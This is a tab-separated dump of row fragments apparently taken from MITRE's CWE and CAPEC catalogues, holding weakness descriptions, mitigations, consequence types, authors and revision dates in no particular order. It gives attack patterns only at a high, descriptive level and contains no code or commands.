24726	46	A program should never call finalize explicitly, except to call super.finalize() inside an implementation of finalize(). In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke one of your finalize() methods because it is declared with public access.
19300	28	CWE Content Team
17907	63	DoS: Resource Consumption (Memory)
17204	23	An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.
12113	62	updated Demonstrative_Examples
24652	35	MITRE
6556	28	CWE Content Team
16827	73	Hide action controls over very commonly used functionality.
16999	39	2012-05-11
11055	61	Stable
15360	21	PLOVER
24823	39	2012-05-11
17185	69	Incomplete
20631	28	CWE Content Team
15469	72	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
15593	39	2011-06-01
6336	39	2008-09-08
15827	104	188
23093	91	Architecture and Design
6200	39	2008-11-24
9408	39	2010-04-05
7700	35	MITRE
9945	35	MITRE
16901	62	updated Modes_of_Introduction, Other_Notes
13431	35	Cigital
13401	62	updated Relationships, Taxonomy_Mappings
22610	55	CAPEC Content Team
23273	28	CWE Content Team
13840	28	CWE Content Team
25175	56	PeerOf
22256	40	The system does not have a sound password policy that is being enforced.
12781	35	Cigital
22747	40	The victim has an active session with the social networking site.
9470	104	205
18234	35	MITRE
22480	62	updated Relationships, Taxonomy_Mappings
18906	56	ChildOf
20857	66	Speed Hashing
21423	39	2010-12-13
19284	100	The MITRE Corporation
25269	26	Implementation
15989	39	2017-11-08
20067	28	CWE Content Team
14616	103	Primary
13990	91	Architecture and Design
18628	28	CWE Content Team
14718	103	Primary
18935	39	2010-12-13
21794	103	Primary
19242	42	Regular expressions can become error prone when defining a complex language even for those experienced in writing grammars. Determine if several smaller regular expressions simplify one large regular expression. Also, subject the regular expression to thorough testing techniques such as equivalence partitioning, boundary value analysis, and robustness. After testing and a reasonable confidence level is achieved, a regular expression may not be foolproof. If an exploit is allowed to slip through, then record the exploit and refactor the regular expression.
19015	62	updated Common_Consequences
24587	92	Explore
20845	46	If the application uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the application to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the application's classpath (CWE-427) or add new entries to the application's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the application.
10461	42	Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.
20270	39	2010-02-16
7821	103	Primary
10270	35	MITRE
19795	81	Availability
13145	94	A successful Reflected attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.
22371	63	Read Application Data
21814	39	2017-11-08
8711	34	In C, using an uninitialized char * in some string libraries will return incorrect results, as the libraries expect the null terminator to always be at the end of a string, even if the string is empty.
21569	97	Try Common or Default Usernames and Passwords
22038	56	ChildOf
8464	51	2014-06-23
15272	39	2017-05-03
15466	39	2019-06-20
14752	81	Integrity
15143	101	CAPEC Content Team
6734	62	updated Relationships
18346	51	2014-06-23
9626	50	Prevent unknown DLLs from loading through whitelisting policy.
23582	31	699
9212	21	PLOVER
11855	39	2015-12-07
18780	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
24392	97	Leveraging Race Conditions
15642	62	updated Common_Consequences
14890	63	Gain Privileges or Assume Identity
7194	62	updated Affected_Resources, Observed_Examples, Relationships, Taxonomy_Mappings
17349	39	2009-07-27
18009	62	updated Common_Consequences
11740	42	When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.
22192	62	updated Demonstrative_Examples, Potential_Mitigations
7468	62	updated Name
14242	63	Quality Degradation
20495	39	2009-12-28
24398	28	CWE Content Team
13681	25	Low
11878	91	Implementation
10806	63	Execute Unauthorized Code or Commands
6960	21	PLOVER
6411	39	2008-08-01
16648	103	Primary
17011	28	CWE Content Team
15934	59	Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses
18661	28	CWE Content Team
9379	63	Other
9850	74	4
7873	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
10513	56	ChildOf
11145	88	Deserialization of Untrusted Data
14856	100	The MITRE Corporation
23713	93	Moderate
7047	28	CWE Content Team
14701	62	updated Background_Details, Common_Consequences, Description, Other_Notes, References
6014	31	1000
6604	39	2011-06-01
9088	69	Draft
22976	35	MITRE
21746	39	2014-07-30
10473	35	MITRE
20332	103	Primary
20265	62	updated Observed_Examples, Relationships
22930	35	MITRE
5970	61	Stable
8920	33	Joseph Wagner
21470	39	2009-10-29
16042	43	Simple
11971	24	MITRE
16619	97	Lock Bumping
17204	61	Stable
22136	103	Primary
19001	62	updated Potential_Mitigations, Time_of_Introduction
16416	67	High
21450	35	MITRE
20618	50	Separate the presentation layer and the business logic layer. Variables at the business logic layer should not be exposed at the presentation layer. This is to prevent computation of business logic from user controlled input data.
12706	56	ChildOf
20903	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fault Injection - source code                            Fault Injection - binary                                                                     Cost effective for partial coverage:                                                                           Forced Path Execution
17513	63	DoS: Resource Consumption (Other)
14610	35	MITRE
7678	103	Primary
11953	35	MITRE
19443	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.
6514	62	updated Common_Consequences
14162	28	CWE Content Team
7816	62	updated Likelihood_of_Exploit, Modes_of_Introduction, Relationships
16010	28	CWE Content Team
20482	39	2008-10-14
8471	31	1000
19819	39	2009-01-12
10909	62	updated Relationships, Taxonomy_Mappings
10780	66	Content Security Policy Level 3
5716	28	CWE Content Team
17415	62	updated Relationships
20205	28	CWE Content Team
9025	31	1000
23531	39	2008-07-01
17401	27	Ability to send HTTP requests to a web application.
22823	39	2017-01-19
7192	102	ChildOf
15456	100	The MITRE Corporation
24664	35	MITRE
13479	42	Use a language that provides abstractions for memory allocation and deallocation.
24699	56	ChildOf
19008	101	CAPEC Content Team
24166	63	Read Application Data
7082	62	updated Relationships
18814	28	CWE Content Team
16241	39	2012-10-30
9453	103	Primary
10342	28	CWE Content Team
21653	35	MITRE
19489	42	Use the least privilege principle.
22398	28	CWE Content Team
12994	35	MITRE
9664	62	updated Potential_Mitigations
11661	39	2008-07-01
18545	62	updated Relationships
14139	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
21108	73	Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.
23418	35	MITRE
12248	81	Access Control
13761	56	CanPrecede
12869	45	Base
11096	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
8658	26	Architecture and Design
23625	62	updated References
18189	28	CWE Content Team
14401	93	Moderate
21343	28	CWE Content Team
14200	28	CWE Content Team
12157	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
9679	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
12972	46	"Spyware" is a commonly used term with many definitions and interpretations. In general, it is meant to software that collects information or installs functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.
20143	39	2008-09-08
15791	28	CWE Content Team
16838	66	The Confused Deputy (or why capabilities might have been invented)
10103	35	MITRE
19982	89	Standard
21636	76	2018-07-31
17620	39	2017-05-03
14840	95	[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target system. the attacker probes for credentials, session tokens, or entry points that bypass credentials altogether.
10042	104	481
22328	61	Draft
10729	39	2008-07-01
23149	35	MITRE
9589	79	Availability
8145	43	Simple
10415	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, References, Relationships
14741	21	Anonymous Tool Vendor (under NDA)
16102	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
23478	28	CWE Content Team
15648	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
14042	31	699
9787	39	2011-09-13
15626	50	Use a language or compiler that performs automatic bounds checking.
12814	28	CWE Content Team
20288	62	updated Observed_Examples
9643	42	Identify and closely inspect the conditions for entering privileged areas of the code, especially those related to authentication, process invocation, and network communications.
15956	62	updated Common_Consequences
13151	63	Read Application Data
14878	60	17
20699	35	MITRE
22089	63	Read Application Data
7944	101	CAPEC Content Team
8550	42	Ensure that non-reentrant functions are not found in signal handlers.
7270	91	Implementation
18578	26	Implementation
13659	35	MITRE
8255	28	CWE Content Team
18004	101	CAPEC Content Team
7561	51	2014-06-23
15540	45	Variant
10138	42	Debugging information should not make its way into a production release.
13959	62	updated Applicable_Platforms
25386	35	MITRE
23599	39	2008-07-01
24438	79	Confidentiality
7383	28	Eric Dalci
8705	70	DSA-1571-1 openssl -- predictable random number generator
9559	70	XSS and CSRF vulnerability on Cpanel
21167	63	Gain Privileges or Assume Identity
5722	26	Operation
13317	81	Access Control
18238	35	MITRE
9833	47	Read Data
19516	101	CAPEC Content Team
24122	23	The software does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.
15931	35	MITRE
5970	78	High
25029	39	2019-01-03
12524	30	Gordon "Fyodor" Lyon
20096	27	None: No specialized resources are required to execute this type of attack.
23336	39	2014-07-30
9364	39	2008-09-08
23150	91	Architecture and Design
24519	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
21766	42	Heed the warnings of compilers and linkers, since they may alert you to improper usage.
12243	28	CWE Content Team
20234	59	Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References, Solutions_and_Mitigations
12255	35	MITRE
18922	104	1108
14926	62	updated Potential_Mitigations
19750	89	Standard
22465	81	Availability
11382	35	MITRE
9261	39	2014-07-30
7761	23	The software makes resources available to untrusted parties when those resources are only intended to be accessed by the software.
19035	90	Language-Independent
17352	35	Cigital
16662	43	Simple
11781	43	Simple
16379	50	Pay attention to the function naming convention (within the WSDL interface). Easy to guess function name may be an entry point for attack.
19965	39	2009-07-27
5847	39	2017-11-08
11353	56	ChildOf
13183	44	High
14237	59	Updated @Abstraction
24026	28	CWE Content Team
10938	55	CAPEC Content Team
10360	39	2010-02-16
15571	28	CWE Content Team
22599	52	Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic.
15827	90	C++
22534	62	updated Potential_Mitigations
11958	62	updated Weakness_Ordinalities
8514	103	Primary
9751	39	2017-11-08
18765	27	A tool capable of sending and receiving packets from a remote system.
13915	46	Since DNS names can be easily spoofed or misreported, and it may be difficult for the software to detect if a trusted DNS server has been compromised, DNS names do not constitute a valid authentication mechanism.             When the software performs a reverse DNS resolution for an IP address, if an attacker controls the server for that IP address, then the attacker can cause the server to return an arbitrary hostname. As a result, the attacker may be able to bypass authentication, cause the wrong hostname to be recorded in log files to hide activities, or perform other attacks.             Attackers can spoof DNS names by either (1) compromising a DNS server and modifying its records (sometimes called DNS cache poisoning), or (2) having legitimate control over a DNS server associated with their IP address.
20249	87	Web Server
8145	69	Incomplete
10555	51	2014-06-23
6828	79	Confidentiality
18899	59	Updated Attack_Motivation-Consequences, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
6863	39	2012-05-11
22256	40	The system uses one factor password based authentication.
25305	81	Confidentiality
22026	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
16985	28	CWE Content Team
11867	28	CWE Content Team
11370	62	updated Potential_Mitigations
16753	89	Standard
12272	51	2014-06-23
22050	39	2012-05-11
21161	35	MITRE
14892	39	2009-01-12
10305	101	CAPEC Content Team
13872	62	updated Common_Consequences, Potential_Mitigations, References
24754	35	MITRE
17988	62	updated Taxonomy_Mappings
7261	59	Updated Description, Description Summary, References, Related_Weaknesses
11357	35	MITRE
18215	24	MITRE
14640	102	ChildOf
16112	43	Simple
9957	34	Optimizations built into the design of the processor can have unintended consequences during the execution of an application.
13863	28	CWE Content Team
11567	28	CWE Content Team
21618	66	Understanding ASP.NET View State
13953	28	CWE Content Team
19737	101	CAPEC Content Team
11330	35	MITRE
25274	31	1000
11115	35	MITRE
9179	104	313
17618	101	CAPEC Content Team
8487	39	2011-06-01
23528	23	The software does not properly manage a user within its environment.
7638	81	Availability
8884	99	Microsoft
6855	54	Medium
24449	104	129
25180	100	The MITRE Corporation
22970	28	CWE Content Team
25331	31	699
8458	45	Variant
15125	28	CWE Content Team
10054	35	MITRE
17565	23	The software stores security-critical state information about its users, or the software itself, in a location that is accessible to unauthorized actors.
22221	31	699
16619	61	Draft
8790	88	Empty Code Block
12640	35	MITRE
10571	35	MITRE
21194	76	2015-11-09
6230	81	Access Control
10394	62	updated Time_of_Introduction
11094	35	MITRE
10678	35	MITRE
11508	47	Hide Activities
5884	81	Other
24012	33	Xuejing Yuan
9193	101	CAPEC Content Team
8730	62	updated Relationships, Other_Notes
14381	56	ChildOf
24316	62	updated Related_Attack_Patterns
21174	62	updated Description
13804	39	2012-05-11
6781	28	CWE Content Team
8260	51	2014-06-23
7334	63	Modify Files or Directories
17705	28	CWE Content Team
24164	35	MITRE
18911	39	2012-05-11
17565	69	Draft
23140	76	2018-07-31
13210	28	CWE Content Team
23066	78	Medium
12560	79	Availability
14964	103	Primary
7112	26	Implementation
11552	85	327
17901	56	ChildOf
6869	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
14225	28	CWE Content Team
18625	33	Chris McMahon Stone
10106	62	updated References
22974	39	2009-07-27
14270	46	In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the software will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.
10592	62	updated Taxonomy_Mappings
13323	50	When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.
7695	81	Confidentiality
25033	39	2017-05-03
24493	101	CAPEC Content Team
12406	101	CAPEC Content Team
17319	103	Primary
22239	28	CWE Content Team
24658	59	Updated Related_Attack_Patterns
15101	42	Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.
15251	35	MITRE
18168	79	Authorization
19102	56	PeerOf
18887	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
8830	81	Confidentiality
22804	39	2014-07-30
19794	63	Modify Application Data
24970	70	Active Man in the Middle Attacks
13643	55	CAPEC Content Team
6953	24	MITRE
23628	45	Base
14468	81	Other
17363	103	Primary
23587	103	Primary
18248	53	The MITRE Corporation
14946	35	MITRE
23878	91	Architecture and Design
24035	80	An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection
20364	42	Developers should anticipate that record delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
17424	28	CWE Content Team
16073	28	CWE Content Team
14635	28	CWE Content Team
12770	47	Read Data
15402	97	Replace Winlogon Helper DLL
17532	101	CAPEC Content Team
22667	39	2009-03-10
22849	39	2011-06-01
16468	28	CWE Content Team
13195	35	MITRE
19702	39	2014-02-18
22337	62	updated Time_of_Introduction
11967	39	2014-07-30
8026	21	CWE Content Team
22825	28	CWE Content Team
21213	69	Draft
24290	103	Primary
16087	73	Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.
12830	53	The MITRE Corporation
23890	35	MITRE
7017	105	Mobile
24236	52	Since this weakness is associated with a code construct, it would be indistinguishable from other errors that produce the same behavior.
23381	56	ChildOf
6559	35	MITRE
10008	35	Cigital
10033	28	CWE Content Team
23914	47	Read Data
8750	62	updated Relationships
17906	31	1000
17001	28	CWE Content Team
5972	62	updated Relationships
16854	39	2012-05-11
18637	48	03
10684	21	CWE Content Team
6255	35	MITRE
15109	28	CWE Content Team
24603	104	436
12272	53	The MITRE Corporation
21173	102	ChildOf
9170	47	Execute Unauthorized Commands
22962	88	Operator Precedence Logic Error
9131	62	updated Relationships
14117	62	updated Relationships, Taxonomy_Mappings
25207	39	2013-02-21
12365	81	Integrity
7901	89	Standard
21712	39	2011-06-27
18260	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
17361	35	MITRE
24128	91	Implementation
24743	35	MITRE
15727	79	Confidentiality
8606	35	MITRE
21844	62	updated Potential_Mitigations, Time_of_Introduction
11127	97	Owner Footprinting
6289	39	2012-05-11
13096	88	Incorrect Behavior Order: Validate Before Canonicalize
14351	62	updated Observed_Examples, Relationships
21121	39	2010-02-16
8063	43	Simple
5957	28	CWE Content Team
17004	104	941
17337	86	http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/
19493	26	Architecture and Design
23987	39	2012-05-11
12564	49	2011
15438	39	2011-06-27
22151	43	Simple
23933	26	Operation
7984	35	MITRE
20709	33	GeeksforGeeks
7474	28	CWE Content Team
17154	56	ChildOf
13226	31	1000
24143	28	CWE Content Team
12839	35	MITRE
5941	39	2018-03-27
20323	45	Variant
17110	62	updated Name
7838	97	Pharming
20786	104	317
7896	35	MITRE
10509	39	2017-05-03
21514	39	2012-05-11
15363	28	CWE Content Team
21411	39	2008-09-08
23652	81	Integrity
23645	26	Implementation
10035	62	updated Applicable_Platforms
19590	35	MITRE
20871	91	Operation
16246	85	546
13136	63	Modify Application Data
13020	62	updated Relationships, Taxonomy_Mappings
11811	39	2008-09-08
15367	35	MITRE
10838	39	2011-06-01
15199	74	2
6002	42	Assign a new temporary password rather than revealing the original password.
13508	26	Implementation
20569	97	Cross-Domain Search Timing
20375	39	2009-10-29
14880	26	Architecture and Design
7710	26	Operation
7306	69	Incomplete
20848	39	2010-06-21
6189	46	When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the software by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.
15580	62	updated Relationships
21732	42	Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.
17411	86	http://security.dico.unimi.it/~roberto/pubs/dimva08-web.pdf
15926	32	Security Research Labs
23836	21	Anonymous Tool Vendor (under NDA)
17645	35	KDM Analytics
23056	28	CWE Content Team
14724	81	Confidentiality
17770	26	Implementation
15251	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
10412	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13150	81	Integrity
7592	22	11
9966	23	An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.
10592	35	MITRE
8064	36	https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/
8997	97	iFrame Overlay
9834	23	The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.
17568	44	High
16428	28	Eric Dalci
18064	39	2010-04-05
22994	100	The MITRE Corporation
9653	28	CWE Content Team
18583	96	2018-07-02
9855	100	The MITRE Corporation
22161	89	Detailed
7581	66	volatile - Multithreaded Programmer's Best Friend
14432	62	updated Relationships
23206	28	CWE Content Team
17153	35	MITRE
8626	39	2011-06-01
15332	28	CWE Content Team
10517	35	MITRE
6224	35	MITRE
7134	35	Cigital
14070	46	When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.
13484	43	Simple
13452	35	Cigital
13602	42	If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.
18261	28	CWE Content Team
8882	35	MITRE
6120	39	2012-05-11
10043	35	MITRE
14400	62	updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
10685	39	2017-11-08
7101	85	226
21512	81	Integrity
12560	79	Confidentiality
10308	45	Base
9909	104	590
7950	59	Updated Related_Attack_Patterns
16334	35	MITRE
10788	62	updated Related_Attack_Patterns
19849	63	Unexpected State
14252	39	2012-05-11
15940	26	Architecture and Design
16520	53	The MITRE Corporation
22388	39	2009-03-10
8819	57	Primary
14903	21	PLOVER
8447	28	CWE Content Team
12918	28	CWE Content Team
22628	56	ChildOf
19152	40	An adversary requires some way of interacting with the system.
24850	31	699
23060	35	MITRE
12810	35	Cigital
15546	56	ChildOf
12615	47	Gain Privileges
6321	86	https://www.quantstart.com/articles/C-Virtual-Destructors-How-to-Avoid-Memory-Leaks
20966	39	2012-05-11
10677	28	CWE Content Team
24198	35	MITRE
18217	31	699
16225	104	790
11157	62	updated Observed_Examples, Potential_Mitigations, Relationships
19349	35	MITRE
12661	35	MITRE
15945	74	3
14508	46	This issue can make the software perform more slowly due to computational expense.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.   While the interpetation of "too many data queries" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.
18243	102	ChildOf
10167	76	2018-07-31
10971	63	DoS: Resource Consumption (Other)
6555	62	updated Applicable_Platforms
24263	96	2018-07-02
14038	39	2008-09-08
19576	62	updated Background_Details, Demonstrative_Examples, Description, Name, Other_Notes, Potential_Mitigations
23866	78	Low
24823	28	CWE Content Team
12779	56	ChildOf
7616	28	CWE Content Team
22704	35	MITRE
15810	91	Architecture and Design
11169	79	Authorization
19360	62	updated Relationships
15142	103	Primary
23912	56	ChildOf
16341	62	updated Observed_Examples
7236	28	CWE Content Team
13697	35	MITRE
15512	62	updated Relationships, Taxonomy_Mappings
21804	39	2014-07-30
11319	62	updated Description
14942	63	Quality Degradation
21006	31	1000
7904	91	Implementation
11289	69	Draft
21311	56	ChildOf
20896	26	Architecture and Design
17545	59	Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required
16167	62	updated Common_Consequences
16979	21	CWE Content Team
8006	92	Explore
14309	39	2018-01-23
19269	54	Medium
21543	28	CWE Content Team
10132	59	Updated Attack_Motivation-Consequences
7006	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15127	26	Implementation
13998	104	246
10998	36	https://en.wikipedia.org/wiki/Spoofing_attack#GPS_Spoofing
15394	56	ChildOf
19895	85	38
6824	39	2018-03-27
24237	35	MITRE
14239	27	Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations
12939	26	Architecture and Design
6990	31	699
25089	35	MITRE
17077	88	Unchecked Error Condition
8977	28	CWE Content Team
15537	28	CWE Content Team
19496	39	2008-08-01
20616	35	MITRE
11672	91	Operation
14695	90	C
8560	91	Requirements
18522	40	The victim has an active session with the target system.
11395	47	Read Data
24604	35	MITRE
9289	35	MITRE
12516	39	2008-07-01
22596	39	2008-07-01
21713	95	[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods
24256	61	Stable
10823	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20639	39	2013-07-17
8338	62	updated Demonstrative_Examples
20372	28	CWE Content Team
9862	92	Exploit
9783	79	Confidentiality
16785	35	MITRE
20070	45	Variant
12298	55	CAPEC Content Team
7582	35	MITRE
21194	59	Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Severity
13671	35	MITRE
19297	91	Testing
14664	66	Top 25 Series - Rank 15 - Improper Check for Unusual or Exceptional Conditions
16660	62	updated Other_Notes
25328	28	Eric Dalci
10578	28	CWE Content Team
15139	78	Medium
11138	62	updated Potential_Mitigations, Relationships
10046	40	Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).
17841	46	When sensitive data such as a password or an encryption key is not removed from memory, it could be exposed to an attacker using a "heap inspection" attack that reads the sensitive data using memory dumps or other methods. The realloc() function is commonly used to increase the size of a block of allocated memory. This operation often requires copying the contents of the old memory block into a new and larger block. This operation leaves the contents of the original block intact but inaccessible to the program, preventing the program from being able to scrub sensitive data from memory. If an attacker can later examine the contents of a memory dump, the sensitive data could be exposed.
15226	62	updated Potential_Mitigations, Time_of_Introduction
19540	62	updated Related_Attack_Patterns
6349	45	Variant
7387	62	updated Relationships
13735	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
8447	39	2009-10-29
22715	35	MITRE
20668	63	Read Files or Directories
20152	62	updated Potential_Mitigations
21870	28	CWE Content Team
6796	69	Incomplete
6936	97	Session Sidejacking
11479	23	Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.
21138	63	Modify Memory
9209	90	Language-Independent
13921	35	MITRE
23978	21	CWE Content Team
21161	28	CWE Content Team
7689	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
16025	26	Implementation
11506	33	Sean Barnum
14174	28	CWE Content Team
16107	62	updated Time_of_Introduction
17274	62	updated Relationships
25348	62	updated Potential_Mitigations, Time_of_Introduction
21118	35	MITRE
24435	50	Configuration: Make sure your DNS servers have been updated to the latest versions
12528	102	ChildOf
19692	78	Low
12775	39	2015-12-07
9050	28	CWE Content Team
10203	53	The MITRE Corporation
13785	73	Brute force guessing of filtered inputs
22494	81	Non-Repudiation
14402	28	CWE Content Team
6268	100	The MITRE Corporation
18614	47	Hide Activities
15824	81	Other
11007	35	Cigital
23274	42	Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
21919	39	2012-05-11
9086	35	MITRE
6805	35	MITRE
17278	86	http://www.owasp.org/index.php/Mobile_code:_object_hijack
21763	96	2011-03-24
6796	43	Simple
8051	85	11
17937	26	Implementation
8646	81	Confidentiality
19736	39	2010-06-21
10379	101	CAPEC Content Team
8665	62	updated Common_Consequences
22489	79	Availability
15642	39	2011-06-01
21415	39	2011-06-01
14933	45	Variant
16390	28	CWE Content Team
19610	54	High
14571	53	The MITRE Corporation
20503	26	Implementation
24099	35	MITRE
9280	35	MITRE
24012	33	Yue Zhao
20353	28	CWE Content Team
18766	47	Modify Data
15184	39	2008-09-08
8352	39	2009-10-29
8610	103	Primary
5639	28	CWE Content Team
14719	28	CWE Content Team
9834	43	Simple
7529	59	Updated Attack_Phases
15747	31	1000
10706	26	Operation
8193	28	CWE Content Team
9684	91	Architecture and Design
12634	100	The MITRE Corporation
20420	91	Operation
21994	63	Gain Privileges or Assume Identity
14874	27	The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as "Strings" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.
8268	39	2011-03-29
11006	62	updated Demonstrative_Examples, Potential_Mitigations
11610	81	Access Control
15554	62	updated Relationships
23795	47	Modify Data
22341	28	CWE Content Team
19917	79	Confidentiality
11232	79	Confidentiality
11917	35	MITRE
15503	91	Testing
8347	39	2008-07-01
15872	100	The MITRE Corporation
22017	81	Confidentiality
13791	39	2012-10-30
15174	28	CWE Content Team
15137	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
25223	35	MITRE
18305	62	updated Relationships
15964	81	Integrity
15949	85	186
8173	28	Eric Dalci
8293	28	Eric Dalci
9420	55	CAPEC Content Team
16565	101	CAPEC Content Team
18260	76	2018-07-31
18763	62	added/updated white box definitions
15041	35	MITRE
14232	49	2009
25230	57	Primary
14196	28	CWE Content Team
19716	78	Low
22050	28	CWE Content Team
10561	62	updated Relationships, Observed_Example, Other_Notes, Research_Gaps, Taxonomy_Mappings, Weakness_Ordinalities
9663	62	updated Detection_Factors, Taxonomy_Mappings
25116	28	CWE Content Team
23814	35	MITRE
25332	35	MITRE
12757	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
18045	43	Simple
9345	62	updated Related_Attack_Patterns
21105	39	2009-05-27
12763	35	MITRE
14250	59	Updated References
5850	28	CWE Content Team
19950	66	Password security: past, present, future
15341	86	http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html
7840	103	Primary
17884	84	15
14655	92	Exploit
14506	69	Draft
11653	48	04
